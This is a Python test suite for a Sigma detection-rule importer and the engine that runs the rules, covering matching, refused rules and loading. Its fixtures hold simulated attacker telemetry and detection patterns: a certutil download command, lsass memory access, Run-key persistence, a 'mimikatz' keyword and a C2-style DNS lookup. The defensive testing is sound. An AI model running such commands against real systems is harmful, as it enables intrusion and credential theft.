"""Sigma import: what matches, what is refused and why, and how imported rules behave inside the engine."""

from __future__ import annotations

import textwrap

import pytest
import yaml
from sentinel_core.models import Severity
from sentinel_core.telemetry import EventKind
from sentinel_detect import Engine, StreamBuilder, SuppressionList
from sentinel_detect.process_tree import ProcessTree
from sentinel_detect.sigma import (
    SigmaRuleSet,
    SigmaUnsupported,
    engine_with_sigma,
    load_sigma_rules,
    main,
    parse_sigma_rule,
)

CMD = r"C:\Windows\System32\cmd.exe"
CERTUTIL = r"C:\Windows\System32\certutil.exe"


def rule(detection: str, category: str = "process_creation", **extra):
    doc = {"title": "Test rule", "id": "11111111-2222-3333-4444-555555555555", "level": "high",
           "logsource": {"product": "windows", "category": category},
           "detection": yaml.safe_load(textwrap.dedent(detection)), **extra}
    return parse_sigma_rule(doc)


def proc(command_line: str, image: str = CERTUTIL, **details):
    b = StreamBuilder()
    event = b.process_create("P", image, parent_guid="C", parent_image=CMD, command_line=command_line)
    event.details.update(details)
    return event


def hit(r, event) -> bool:
    tree = ProcessTree()
    tree.ingest(event)
    return r.matches(event, tree)


# ---------------------------------------------------------------- matching


def test_field_modifiers_and_case_insensitivity():
    r = rule(r"""
        selection:
            Image|endswith: '\CertUtil.exe'
            CommandLine|contains|all: ['-URLCACHE', 'http']
        condition: selection
    """)
    assert hit(r, proc("certutil -urlcache -f http://h/a a.exe"))
    assert not hit(r, proc("certutil -urlcache -f ftp://h/a"))  # 'all' needs both
    assert not hit(r, proc("x -urlcache http", image=CMD))


def test_list_of_maps_is_any_and_map_is_all():
    r = rule(r"""
        selection_img:
            - Image|endswith: '\certutil.exe'
            - OriginalFileName: 'CertUtil.exe'
        selection_cli:
            CommandLine|contains: 'decode'
        condition: all of selection_*
    """)
    assert hit(r, proc("x -decode a b"))
    assert hit(r, proc("x -decode a b", image=r"C:\Temp\renamed.exe", original_file_name="CertUtil.exe"))
    assert not hit(r, proc("x -decode a b", image=r"C:\Temp\renamed.exe"))


@pytest.mark.parametrize(("pattern", "command_line", "expected"), [
    (r"' \\\\'", r"certutil -syncwithWU \\10.0.1.14\share", True),  # \\\\ in a rule is two real backslashes
    (r"'\\\\127.0.0.1\\admin$\\'", r"cmd /c x > \\127.0.0.1\ADMIN$\out.txt", True),
    (r"'C:\Users\'", r"type C:\Users\a.txt", True),  # a lone backslash is just a backslash
    (r"'a*b'", "xx a123b yy", True),
    (r"'a\*b'", "xx a123b yy", False),  # escaped asterisk is literal
    (r"'a\*b'", "xx a*b yy", True),
    (r"'a?c'", "abc", True),
    (r"'a?c'", "ac", False),
])
def test_sigma_escaping_and_wildcards(pattern, command_line, expected):
    r = rule(f"""
        selection:
            CommandLine|contains: {pattern}
        condition: selection
    """)
    assert hit(r, proc(command_line)) is expected


def test_exact_match_wildcards_are_anchored():
    r = rule(r"""
        selection:
            Image: '*\certutil.exe'
        condition: selection
    """)
    assert hit(r, proc("x")) and not hit(r, proc("x", image=CERTUTIL + ".bak"))


def test_windash_regex_cidr_numeric_exists_and_null():
    assert hit(rule("selection: {CommandLine|contains|windash: ' -decode '}\ncondition: selection"), proc("x /decode y"))
    assert hit(rule(r"selection: {CommandLine|re: 'url(cache|fetch)\s'}" "\ncondition: selection"), proc("x -URLCACHE y"))
    assert not hit(rule(r"selection: {CommandLine|re|cased: 'urlcache'}" "\ncondition: selection"), proc("x -URLCACHE"))
    assert hit(rule("selection: {OriginalFileName|exists: false}\ncondition: selection"), proc("x"))
    assert hit(rule("selection: {ParentCommandLine: null}\ncondition: selection"), proc("x"))

    b = StreamBuilder()
    net = b.network_connect("P", "10.1.2.3", 4444, image=CMD)
    cidr = rule("selection: {DestinationIp|cidr: '10.0.0.0/8', DestinationPort|gte: 1024, Initiated: 'true'}\n"
                "condition: selection", category="network_connection")
    assert hit(cidr, net)
    assert not hit(cidr, b.network_connect("P", "8.8.8.8", 4444, image=CMD))


@pytest.mark.parametrize(("condition", "expected"), [
    ("a and b", False), ("a or b", True), ("a and not b", True), ("not a or b", False),
    ("(a or b) and not c", True), ("1 of them", True), ("all of them", False), ("2 of them", True), ("3 of them", False),
    ("1 of sel_*", True), ("all of sel_* and a", False), ("any of sel_*", True),
])
def test_condition_expressions(condition, expected):
    r = rule(f"""
        a: {{CommandLine|contains: 'alpha'}}
        b: {{CommandLine|contains: 'beta'}}
        c: {{CommandLine|contains: 'gamma'}}
        sel_one: {{CommandLine|contains: 'alpha'}}
        sel_two: {{CommandLine|contains: 'delta'}}
        condition: {condition}
    """)
    assert hit(r, proc("alpha only")) is expected


def test_parent_command_line_comes_from_the_tree_when_not_recorded():
    b = StreamBuilder()
    parent = b.process_create("C", CMD, command_line="cmd /c evil.bat")
    child = b.process_create("P", CERTUTIL, parent_guid="C", parent_image=CMD, command_line="x")
    tree = ProcessTree()
    tree.ingest(parent)
    tree.ingest(child)
    r = rule("selection: {ParentCommandLine|contains: 'evil.bat'}\ncondition: selection")
    assert r.matches(child, tree)


def test_registry_and_process_access_fields():
    b = StreamBuilder()
    reg = b.registry_set("P", r"HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run", "Upd", value=1, image=CMD)
    r = rule(r"""
        selection:
            TargetObject|contains: '\CurrentVersion\Run\'
            Details: 'DWORD (0x00000001)'
        condition: selection
    """, category="registry_set")
    assert r.kind is EventKind.REGISTRY_SET and hit(r, reg)
    access = b.process_access("P", r"C:\Windows\System32\lsass.exe", granted_access=0x1410, image=CMD)
    r = rule(r"""
        selection:
            TargetImage|endswith: '\lsass.exe'
            GrantedAccess|startswith: '0x14'
        condition: selection
    """, category="process_access")
    assert hit(r, access)


# ---------------------------------------------------------------- refusals


@pytest.mark.parametrize(("detection", "category", "reason"), [
    ("selection: {NoSuchField: 'x'}\ncondition: selection", "process_creation", "not captured"),
    ("selection: {CommandLine|base64offset|contains: 'x'}\ncondition: selection", "process_creation", "modifier"),
    ("selection: {CommandLine: 'x'}\ncondition: selection | count() > 5", "process_creation", "aggregation"),
    ("selection: {CommandLine: 'x'}\ntimeframe: 5m\ncondition: selection", "process_creation", "timeframe"),
    ("keywords: ['mimikatz']\ncondition: keywords", "process_creation", "keyword"),
    ("selection: {CommandLine: 'x'}\ncondition: selection and missing", "process_creation", "unknown selection"),
    ("selection: {CommandLine: 'x'}\ncondition: (selection", "process_creation", "unexpectedly"),
    ("selection: {CommandLine|re: '('}\ncondition: selection", "process_creation", "regular expression"),
    ("selection: {CommandLine: 'x'}\ncondition: selection", "ps_script", "not collected"),
])
def test_unsupported_rules_are_refused_with_a_reason(detection, category, reason):
    with pytest.raises(SigmaUnsupported, match=reason):
        rule(detection, category=category)


def test_other_products_and_non_rules_are_refused():
    with pytest.raises(SigmaUnsupported, match="product 'linux'"):
        parse_sigma_rule({"logsource": {"product": "linux", "category": "process_creation"},
                          "detection": {"s": {"Image": "x"}, "condition": "s"}})
    with pytest.raises(SigmaUnsupported, match="not a detection rule"):
        parse_sigma_rule({"title": "notes"})


# ---------------------------------------------------------------- loading and the engine

GOOD = """
title: Certutil download
id: aaaaaaaa-0000-0000-0000-000000000001
status: test
description: certutil used as a downloader.
level: high
tags: [attack.defense-evasion, attack.t1105, attack.T1218]
logsource: {product: windows, category: process_creation}
detection:
    selection: {Image|endswith: '\\certutil.exe', CommandLine|contains: 'urlcache'}
    condition: selection
falsepositives: [Administrators fetching certificates]
"""
LOW = GOOD.replace("level: high", "level: low").replace("0001", "0002")
BAD = GOOD.replace("process_creation", "ps_script").replace("0001", "0003")


@pytest.fixture
def rules_dir(tmp_path):
    (tmp_path / "sub").mkdir()
    (tmp_path / "good.yml").write_text(GOOD, encoding="utf-8")
    (tmp_path / "sub" / "low.yaml").write_text(LOW, encoding="utf-8")
    (tmp_path / "bad.yml").write_text(BAD, encoding="utf-8")
    (tmp_path / "dup.yml").write_text(GOOD, encoding="utf-8")
    (tmp_path / "broken.yml").write_text("title: [unclosed", encoding="utf-8")
    (tmp_path / "notes.txt").write_text("ignored", encoding="utf-8")
    return tmp_path


def test_loader_imports_what_it_can_and_explains_the_rest(rules_dir):
    imported = load_sigma_rules([rules_dir])
    assert [r.rule_id for r in imported.rules] == ["sigma.aaaaaaaa-0000-0000-0000-000000000001"]
    reasons = " | ".join(reason for _, reason in imported.skipped)
    assert len(imported.skipped) == 4
    for expected in ("below the import threshold", "not collected", "duplicate rule id", "could not be read"):
        assert expected in reasons
    assert len(load_sigma_rules([rules_dir], min_level=Severity.LOW).rules) == 2
    assert sum(imported.skip_reasons().values()) == 4


def test_imported_rule_fires_through_the_engine_with_its_own_identity(rules_dir):
    engine, imported = engine_with_sigma([rules_dir])
    assert len(imported.rules) == 1
    event = proc("certutil -urlcache -f http://h/a a.exe")
    detections = engine.feed_stream([event])
    sigma = [d for d in detections if d.rule_id.startswith("sigma.")]
    assert len(sigma) == 1 and "exec.lolbin_abuse" in {d.rule_id for d in detections}
    d = sigma[0]
    assert d.title == "Certutil download" and d.severity == "high" and d.technique_ids == ["T1105", "T1218"]
    assert "Administrators fetching certificates" in d.explanation and d.events == [event]
    assert engine.feed_stream([event]) == []  # repeats of the same behaviour are throttled like any other rule


def test_without_rules_the_engine_is_unchanged(tmp_path):
    engine, imported = engine_with_sigma([tmp_path])
    assert imported.rules == [] and all(not isinstance(r, SigmaRuleSet) for r in engine.rules)


def test_a_rule_that_raises_never_stops_the_engine():
    r = rule("selection: {CommandLine|contains: 'x'}\ncondition: selection")
    r.matches = lambda e, t: 1 / 0  # type: ignore[assignment]
    engine = Engine(rules=[SigmaRuleSet([r])], suppressions=SuppressionList([]))
    assert engine.feed_stream([proc("x")]) == []


def test_only_rules_for_the_event_kind_are_evaluated():
    calls = []
    r = rule("selection: {QueryName|endswith: '.invalid'}\ncondition: selection", category="dns_query")
    inner = r.matches
    r.matches = lambda e, t: calls.append(e.kind) or inner(e, t)  # type: ignore[assignment]
    b = StreamBuilder()
    b.process_create("P", CMD)
    b.dns_query("P", "c2.example.invalid", image=CMD)
    out = Engine(rules=[SigmaRuleSet([r])], suppressions=SuppressionList([])).feed_stream(b.events)
    assert calls == [EventKind.DNS_QUERY] and len(out) == 1


def test_command_line_report(rules_dir, capsys):
    assert main([str(rules_dir), "--list-skipped"]) == 0
    out = capsys.readouterr().out
    assert "1 of 5 rule files imported" in out and "process_create" in out and "bad.yml" in out
